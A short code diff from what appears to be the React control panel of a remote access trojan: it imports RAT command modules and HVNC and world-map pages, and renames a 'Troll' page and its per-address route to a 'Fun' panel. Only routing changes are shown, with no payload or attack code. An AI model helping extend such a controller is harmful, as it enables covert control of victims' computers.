@@ -21,7 +21,7 @@ import {
 } from "./rat/RATCommands";
 import { HVNC } from "./pages/HVNC";
 import { WorldMap } from "./pages/WorldMap";
-import { Troll } from "./pages/Troll";
+import { FunPanel } from "./pages/Fun";
 import { InputBox } from "./pages/InputBox";
 
 export const App: React.FC = () => {
@@ -101,10 +101,10 @@ export const App: React.FC = () => {
           }
         />
         <Route
-          path="/troll/:addr"
+          path="/fun/:addr"
           element={
             <WindowWrapper feature_cleanup={() => {}}>
-              <Troll />
+              <FunPanel />
             </WindowWrapper>
           }
         />
